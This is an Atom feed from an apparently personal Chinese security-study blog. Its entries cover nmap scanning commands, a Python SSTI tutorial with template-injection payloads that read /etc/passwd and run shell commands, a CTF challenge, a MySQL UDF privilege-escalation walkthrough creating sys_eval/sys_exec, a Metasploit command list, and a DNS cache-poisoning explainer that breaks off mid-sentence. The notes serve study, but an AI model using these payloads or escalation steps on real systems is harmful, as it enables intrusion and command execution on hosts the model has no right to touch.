<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-01T11:14:12.228Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nmap的用法</title>
    <link href="http://yoursite.com/2020/07/12/nmap%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>http://yoursite.com/2020/07/12/nmap%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2020-07-12T10:00:56.810Z</published>
    <updated>2020-06-01T11:14:12.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nmap的用法"><a href="#nmap的用法" class="headerlink" title="nmap的用法"></a>nmap的用法</h1><blockquote><p>Nmap，也就是Network Mapper，最早是Linux下的网络扫描和<a href="https://baike.baidu.com/item/嗅探/5114370" target="_blank" rel="noopener">嗅探</a>工具包</p><p>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p><p>正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。</p><p>Nmap 常被跟评估系统漏洞软件<a href="https://baike.baidu.com/item/Nessus" target="_blank" rel="noopener">Nessus</a> 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。</p><p>其<strong>基本功能</strong>有三个，一是探测一组主机是否在线；其次是扫描 主机端口，嗅探所提供的网络服务；还可以推断主机所用的操作系统 。Nmap可用于扫描仅有两个节点的LAN，直至500个节点以上的网络。Nmap 还允许用户定制扫描技巧。通常，一个简单的使用ICMP协议的ping操作可以满足一般需求；也可以深入探测UDP或者TCP端口，直至主机所 使用的操作系统；还可以将所有探测结果记录到各种格式的日志中， 供进一步分析操作。</p><p>进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)：<br>nmap -sP 192.168.1.0/24</p><p>仅列出指定网络上的每台主机，不发送任何报文到目标主机：<br>nmap -sL 192.168.1.0/24</p><p>探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)：<br>nmap -PS 192.168.1.234</p><p>使用UDP ping探测主机：<br>nmap -PU 192.168.1.0/24</p><p>使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快：<br>nmap -sS 192.168.1.0/24</p><p>当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描：<br>nmap -sT 192.168.1.0/24</p><p>UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口:<br>nmap -sU 192.168.1.0/24</p><p>确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等):<br>nmap -sO 192.168.1.19</p><p>探测目标主机的操作系统：<br>nmap -O 192.168.1.19<br>nmap -A 192.168.1.19</p><p>另外，nmap官方文档中的例子：<br>nmap -v scanme.</p><p>这个选项扫描主机scanme中 所有的保留TCP端口。选项-v启用细节模式。<br>nmap -sS -O scanme./24</p><p>进行秘密SYN扫描，对象为主机Scanme所在的“C类”网段 的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。<br>nmap -sV -p 22，53，110，143，4564 188.116.0-255.1-127</p><p>进行主机列举和TCP扫描，对象为B类188.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。<br>nmap -v -iR 100000 -P0 -p 80</p><p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段 发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因 此使用-P0禁止对主机列表。<br>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p><p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。<br>host -l | cut -d -f 4 | nmap -v -iL -</p><p>进行DNS区域传输，以发现中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。</p><p>其他选项：<br>-p (只扫描指定的端口)</p><p>单个端口和用连字符表示的端口范 围(如 1-1023)都可以。当既扫描TCP端口又扫描UDP端口时，可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。</p><p>-F (快速 (有限的端口) 扫描)</p></blockquote><p>参考博客：<a href="https://www.cnblogs.com/bonelee/p/9188122.html" target="_blank" rel="noopener">https://www.cnblogs.com/bonelee/p/9188122.html</a></p><p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnamp。</p><p>Nmap可以完成以下任务：</p><blockquote><ul><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ul></blockquote><blockquote><ul><li>Nmap在实际中应用场合如下：</li><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ul></blockquote><p>端口扫描工具，即借助工具，试图了解所扫描IP提供的计算机网络服务类型（网络服务均与端口号相关），从而发现攻击弱点，常见服务对应端口号：</p><table><thead><tr><th>服务</th><th>端口号</th></tr></thead><tbody><tr><td>HTTP</td><td>80</td></tr><tr><td>HTTPS</td><td>443</td></tr><tr><td>Telnet</td><td>23</td></tr><tr><td>FTP</td><td>21</td></tr><tr><td>SSH（安全登录）、SCP（文件传输）、端口重定向</td><td>22</td></tr><tr><td>SMTP</td><td>25</td></tr><tr><td>POP3</td><td>110</td></tr><tr><td>WebLogic</td><td>7001</td></tr><tr><td>TOMCAT</td><td>8080</td></tr><tr><td>WIN2003远程登录</td><td>3389</td></tr><tr><td>Oracle数据库</td><td>1521</td></tr><tr><td>MS SQL* SEVER数据库sever</td><td>1433</td></tr><tr><td>MySQL 数据库sever</td><td>3306</td></tr></tbody></table><p>from: <a href="https://blog.csdn.net/code_ac/article/details/74131967" target="_blank" rel="noopener">https://blog.csdn.net/code_ac/article/details/74131967</a></p><h3 id="nmap基本使用方法"><a href="#nmap基本使用方法" class="headerlink" title="nmap基本使用方法"></a><strong>nmap基本使用方法</strong></h3><h4 id="1、nmap简单扫描"><a href="#1、nmap简单扫描" class="headerlink" title="1、nmap简单扫描"></a><strong>1、nmap简单扫描</strong></h4><p>nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口</p><p>命令语法：<br> nmap &lt;<em>target ip address</em>&gt;</p><p>其中：target ip address是扫描的目标主机的ip地址</p><p>例子:nmap 10.0.0.55</p><p>效果如下：<br> <img src="https://img-blog.csdn.net/20170702164158778?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="2、nmap简单扫描，并对结果返回详细的描述输出"><a href="#2、nmap简单扫描，并对结果返回详细的描述输出" class="headerlink" title="2、nmap简单扫描，并对结果返回详细的描述输出"></a><strong>2、nmap简单扫描，并对结果返回详细的描述输出</strong></h4><p>命令语法：namp -vv &lt;<em>target ip address</em>&gt;</p><p>介绍：-vv参数设置对结果的详细输出</p><p>例子：nmap -vv 10.0.0.55</p><p>效果如下：<br> <img src="https://img-blog.csdn.net/20170702164234311?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="3、nmap自定义扫描"><a href="#3、nmap自定义扫描" class="headerlink" title="3、nmap自定义扫描"></a><strong>3、nmap自定义扫描</strong></h4><p>命令语法：nmap -p(range) &lt;<em>target IP</em>&gt;</p><p>介绍：（range）为要扫描的端口范围，端口大小不能超过65535</p><p>例子：扫描目标主机的1-50号端口</p><p>nmap -p50-80 10.0.0.55</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164302250?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="4、nmap-指定端口扫描"><a href="#4、nmap-指定端口扫描" class="headerlink" title="4、nmap 指定端口扫描"></a><strong>4、nmap 指定端口扫描</strong></h4><p>命令语法：nmap -p(port1,port2,…) &lt;<em>target IP</em>&gt;</p><p>介绍：port1,port2…为想要扫描的端口号</p><p>例子：扫描目标主机的80，443，801端口</p><p>nmap -p80,443,801 10.0.0.55</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164322010?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="5、nmap-ping-扫描"><a href="#5、nmap-ping-扫描" class="headerlink" title="5、nmap ping 扫描"></a><strong>5、nmap ping 扫描</strong></h4><p>nmap可以利用类似windows/linux系统下的ping 方式进行扫描</p><p>命令语法： nmap -sP &lt;<em>target ip</em>&gt;</p><p>例子：nmap sP 10.1.112.89</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164344476?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="6、nmap-路由跟踪"><a href="#6、nmap-路由跟踪" class="headerlink" title="6、nmap 路由跟踪"></a><strong>6、nmap 路由跟踪</strong></h4><p>路由器追踪功能，能够帮助网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具，通过路由器追踪可以轻松的查处从我们电脑所在地到目的地之间所经常的网络节点，并可以看到通过各个结点所花费的时间</p><p>命令语法：<br> nmap –traceroute &lt;<em>target IP</em>&gt;</p><p>例子:namp –traceroute 8.8.8.8(geogle dns服务器ip)</p><p>效果<br> <img src="https://img-blog.csdn.net/20170702164418798?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="7、nmap设置扫描一个网段下的ip"><a href="#7、nmap设置扫描一个网段下的ip" class="headerlink" title="7、nmap设置扫描一个网段下的ip"></a><strong>7、nmap设置扫描一个网段下的ip</strong></h4><p>命令语法：<br> nmap -sP &lt;<em>network address</em>&gt; &lt;<em>/CIDR</em>&gt;</p><p>介绍：CIDR为设置的子网掩码（/24,/16,/8等）</p><p>例子：nmap -sP 10.1.1.0 /24</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164439038?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="8、nmap-操作系统类型的探测"><a href="#8、nmap-操作系统类型的探测" class="headerlink" title="8、nmap 操作系统类型的探测"></a><strong>8、nmap 操作系统类型的探测</strong></h4><p>命令语法：<br> nmap -0 &lt;<em>target IP</em>&gt;</p><p>例子：nmap -O(大写的o) 10.1.112.89</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164500897?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="9、nmap万能开关"><a href="#9、nmap万能开关" class="headerlink" title="9、nmap万能开关"></a><strong>9、nmap万能开关</strong></h4><p>包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测</p><p>命令语法：<br> nmap -A &lt;<em>target ip</em>&gt;</p><p>例子：nmap -A 10.1.112.89</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164533492?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="10、nmap命令混合式扫描"><a href="#10、nmap命令混合式扫描" class="headerlink" title="10、nmap命令混合式扫描"></a><strong>10、nmap命令混合式扫描</strong></h4><p>可以做到类似参数-A所完成的功能，但又能细化我们的需求要求</p><p>命令语法：<br> nmap -vv -p1-100 -O &lt;<em>target ip</em>&gt;</p><p>例子：<br> nmap -vv -p1-100 -O 10.1.112.89</p><p>效果：<br> <img src="https://img-blog.csdn.net/20170702164557294?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY29kZV9BQw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;nmap的用法&quot;&gt;&lt;a href=&quot;#nmap的用法&quot; class=&quot;headerlink&quot; title=&quot;nmap的用法&quot;&gt;&lt;/a&gt;nmap的用法&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Nmap，也就是Network Mapper，最早是Linux下的网络扫描
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>img</title>
    <link href="http://yoursite.com/2020/07/07/img/"/>
    <id>http://yoursite.com/2020/07/07/img/</id>
    <published>2020-07-07T05:08:09.000Z</published>
    <updated>2020-07-07T05:16:31.442Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/07/07/img/2.jpg" alt="2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2020/07/07/img/2.jpg&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python SSTI</title>
    <link href="http://yoursite.com/2020/06/29/python%20SSTI/"/>
    <id>http://yoursite.com/2020/06/29/python%20SSTI/</id>
    <published>2020-06-29T12:33:33.253Z</published>
    <updated>2020-06-29T11:22:35.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-SSTI注入"><a href="#python-SSTI注入" class="headerlink" title="python SSTI注入"></a>python SSTI注入</h1><h3 id="SSTI是什么"><a href="#SSTI是什么" class="headerlink" title="SSTI是什么"></a>SSTI是什么</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。<br>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。<br>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。<br>现在网上提起的比较多的是Python的网站。</p><p>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/96480967" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/96480967</a></p><blockquote><p>python模块注入：</p><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><p><strong>测试方法：</strong></p><p>1、确定使用的引擎<br>2、查看引擎相关的文档，确定其安全机制以及自带的函数和变量<br>3、需找攻击面，尝试攻击</p><p><strong>测试用例</strong></p><pre><code>简单的数学表达式：{{ 7+7 }} =&gt; 14字符串表达式 ：{{ "ajin" }} =&gt; ajinRuby：&lt;%= 7 * 7 %&gt;&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;Java：${7*7}Twig：{{7*7}}Smarty：{php}echo `id`;{/php}AngularJS：$eval(&#39;1+1&#39;)Tornado：引用模块 {% import module %}=&gt; {% import os %}{{ os.popen("whoami").read() }}Flask/Jinja2：{{ config.items() }}{{''.__class__.__mro__[-1].__subclasses__()}}Django：{{ request }}{% debug %}{% load module %}{% include "x.html" %}{% extends "x.html" %}</code></pre><p><strong>目标</strong></p><p>创建对象<br>文件读写<br>远程文件包含<br>信息泄漏<br>提权</p><p><strong>相关属性</strong><br><code>__class__</code></p><pre><code>python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 ``&quot;&quot;.__class__`` 就可以获取到字符串实例对应的类``__mro__`` </code></pre><p>python中类对象的 <code>__mro__</code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p><p><code>__globals__</code></p><pre><code>保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 ``file`` ``os`` 等模块以进行下一步的利用``__subclasses__()``</code></pre><p>python的新式类都保留了它所有的子类的引用，<strong>subclasses</strong>() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p><p>因为python中的类都是继承object的，所以只要调用object类对象的 <strong>subclasses</strong>() 方法就可以获取想要的类的对象。</p><p><strong>常见Payload</strong></p><p>1、<code>().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()</code></p><p>2、`().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals.values()[13]<a href="'__import__(" os"">‘eval’</a>.popen(“ls /“).read()’ )</p></blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_37865996/java/article/details/102365374" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/java/article/details/102365374</a></p><p><strong>例题：</strong></p><p>攻防世界shrine</p><p>此题涉及SSTI、Flask 框架、Bypass Sandbox</p><p>看这里：<a href="https://www.cnblogs.com/gzs-monkey/p/10727330.html" target="_blank" rel="noopener">https://www.cnblogs.com/gzs-monkey/p/10727330.html</a></p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()    //默认访问路径为‘/’，那么会将源代码读取出来，也就是默认页面所呈现的。@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))//访问‘/shrine/’路径下，传入一个值，返回的是上面的这一行，输入的值首先被传到了safe_jinja函数，然后由flask.render_template_string进行渲染if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>flask 在 /shrine/ 下的 SSTI，对 payload 进行了过滤，对小括号进行了替换，将 ( 和 ) 替换为空字符串，将 config 和 self 添加进了黑名单</p><p>payload：<code>/shrine/</code></p><p>参考博客：<a href="https://blog.csdn.net/mochu7777777/article/details/104868162" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104868162</a></p><p><a href="https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-SSTI注入&quot;&gt;&lt;a href=&quot;#python-SSTI注入&quot; class=&quot;headerlink&quot; title=&quot;python SSTI注入&quot;&gt;&lt;/a&gt;python SSTI注入&lt;/h1&gt;&lt;h3 id=&quot;SSTI是什么&quot;&gt;&lt;a href=&quot;#SS
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>mysql udf提权原理</title>
    <link href="http://yoursite.com/2020/06/29/mysql%20udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/29/mysql%20udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-29T11:31:33.869Z</published>
    <updated>2020-06-29T12:34:54.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql-udf提权原理"><a href="#mysql-udf提权原理" class="headerlink" title="mysql udf提权原理"></a>mysql udf提权原理</h1><p><strong>什么是udf？</strong></p><pre><code> udf = ‘user defined function‘，即‘用户自定义函数’。 是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。 udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。</code></pre><p>原文链接：<a href="https://blog.csdn.net/Mikasa_/java/article/details/89878927" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/java/article/details/89878927</a></p><p><strong>UDF提权原理：</strong></p><p>利用root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，然后利用 system权限进行提权操作。（利用MYSQL的自定义函数功能，将MYSQL帐号转化为系统system权限）</p><p>使用udf分三步：</p><ol><li>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）</li><li>从udf文件中引入自定义函数(user defined function)</li><li>执行自定义函数</li></ol><p><strong>本地实验：</strong></p><p><code>C:\Users\DELL\AppData\Local\Programs\Python\Python38\sqlmap\extra\cloak&gt;python cloak.py -d -i C:\Users\DELL\AppData\Local\Programs\Python\Python38\sqlmap\data\udf\mysql\windows\32\lib_mysqludf_sys.dll_</code></p><p>得到一个类型为应用程序扩展的文件。</p><p>进入mysql命令行（<code>mysql -u root -p</code>）：</p><p>输入<code>select  @@plugin_dir;</code>   得到dll文件的储存位置</p><p>将解密得到的dll文件复制到刚刚得到的目录下。</p><p>创建命令执行函数：</p><pre><code>create function  sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;或create function  sys_exec returns string soname &#39;lib_mysqludf_sys.dll&#39;;</code></pre><p>创建完成后可以直接运用执行系统命令：</p><p>select sys_eval(‘regedit’);</p><p>会弹注册表。</p><p>原文链接：<a href="https://blog.csdn.net/Mikasa_/java/article/details/89878927" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/java/article/details/89878927</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mysql-udf提权原理&quot;&gt;&lt;a href=&quot;#mysql-udf提权原理&quot; class=&quot;headerlink&quot; title=&quot;mysql udf提权原理&quot;&gt;&lt;/a&gt;mysql udf提权原理&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是udf？&lt;/strong&gt;&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MSF工具</title>
    <link href="http://yoursite.com/2020/06/29/MSF%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2020/06/29/MSF%E5%B7%A5%E5%85%B7/</id>
    <published>2020-06-29T11:10:37.676Z</published>
    <updated>2020-06-29T11:10:41.061Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF工具"><a href="#MSF工具" class="headerlink" title="MSF工具"></a>MSF工具</h1><p>msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种木马。通过MSF工具可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。是信息收集、漏洞扫描、权限提升、内网渗透等集成的工具。</p><p>输入msfconsole 进入msfconsole框架</p><pre><code>基本命令msfconsole   #启动MSF console界面msfupdate    #msf版本更新help/?       #打印当下窗口的帮助文档help command/command --help #打印command命令的帮助文档connect      #可以看成是msfconsole界面下的nc工具edit         #编辑模块的ruby文件，与用vim编辑相同show         #查看命令，可以看当前环境下的exploits、auxiliary、payloads等模块,其中Rank表示不同模块的评级（成功率和使用难易程度的重要参考），             #最常使用的是`show options`命令，表示当前上下文环境中的选项内容,`show missing`可以查看当前有哪些必须的配置没有设置show advanced   #一些不常用的高级选项，不会在`show options`中显示search       #搜索关键词内容对应的模块，如搜索ms10_046漏洞模块：（注意搜索出的内容所在基本目录为`/usr/share/metasploit-framework/modules/`）,除此之外search还可以添加一些筛选条件，如name、path、type等info         #当前模块的基本信息use          #使用不同的模块文件set/unset    #设置变量/取消变量设置setg/unsetg  #设置全局变量/取消全局变量设置，只会设置当前msf运行环境中的变量，退出msf后设置就复位save         #将设置保存到/root/.msf4/config，msf启动时会读取该文件，这样重新启动msf后设置依然保留back         #从模块上下文退回到msfconsole初始目录run/exploit  #运行漏洞模块sessions     #可以看见当前已经建立的攻击连接，利用`sessions -i id`命令进入指定连接jobs         #查看后台运行的模块load/unload  #连接插件，如load openvas，然后会出现相应的openvas命令，使用时需要用openvas_connect连接外部扫描器loadpath     #调用自己编写的功能模块route        #向session指定路由resource     #调用rc文件的命令并执行，以方便直接取得session</code></pre><p>原文链接：<a href="https://blog.csdn.net/Captain_RB/java/article/details/103836565" target="_blank" rel="noopener">https://blog.csdn.net/Captain_RB/java/article/details/103836565</a></p><p>MSF渗透测试：<a href="https://www.freebuf.com/sectool/210292.html#" target="_blank" rel="noopener">https://www.freebuf.com/sectool/210292.html#</a></p><p>一些参数：<a href="https://blog.bbskali.cn/index.php/archives/1760/" target="_blank" rel="noopener">https://blog.bbskali.cn/index.php/archives/1760/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MSF工具&quot;&gt;&lt;a href=&quot;#MSF工具&quot; class=&quot;headerlink&quot; title=&quot;MSF工具&quot;&gt;&lt;/a&gt;MSF工具&lt;/h1&gt;&lt;p&gt;msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种木马。通过MSF工具可以很
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>缓存欺骗原理</title>
    <link href="http://yoursite.com/2020/06/29/%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/29/%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-29T08:58:20.244Z</published>
    <updated>2020-06-29T10:12:02.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存欺骗原理"><a href="#缓存欺骗原理" class="headerlink" title="缓存欺骗原理"></a>缓存欺骗原理</h1><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 </p><p>原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><p>具体实现原理：</p><p>　1、当一个DNS缓存服务器从用户处获得域名请求时，服务器会在缓存中寻找是否有这个地址。如果没有，它就会向上级DNS服务器发出请求。<br>　　2、在出现这种漏洞之前，攻击者很难攻击DNS服务器；他们必须通过发送伪造查询响应、获得正确的查询参数以进入缓存服务器，进而控制合法DNS服务器。这个过程通过持续不到一秒钟，因此此类非法攻击很难获得成功。<br>　　3、但是现在利用该漏洞，攻击者有了转变。这是攻击者对缓存服务器进行持续不断查询请求，服务器不予以回应。比如一个攻击者可能发出类似请求：1y2a3n4g.g.cn，而且他也直到缓存服务器中不可能有这个域名。这就会引起缓存服务器发出更多查询请求，并且会出现更多欺骗应答的机会。<br>　　4、当然，这并不是说攻击者拥有很多机会来猜测查询参数的正确值。事实上，是这种开放源DNS服务器漏洞的公布，会让它在10s内受到危险攻击。<br>　　5、要知道，即使1y2a3n4g.g.cn受到缓存DNS中毒攻击危害也不大，因为没有人会发送这样的域名请求，但是，攻击者可以通过欺骗应答给缓存服务器指向一个非法的服务器域名地址，该地址对应一般为攻击者所控制或者伪装成DNS服务器或者DNS代理。<br>　　6、由于攻击者现在可以控制DNS域名服务器，每个网址的查询请求都会被重定向到黑客所指定的服务器上。</p><p><strong>主要欺骗形式</strong></p><p>1．hosts文件篡改<br>Hosts文件是一个用于存储计算机网络中节点信息的文件，它可以将主机名映射到相应的IP地址，实现DNS的功能，它可以由计算机的用户进行控制。<br>Hosts文件的存储位置在不同的操作系统中并不相同，甚至不同Windows版本的位置也不大一样：<br>Windows 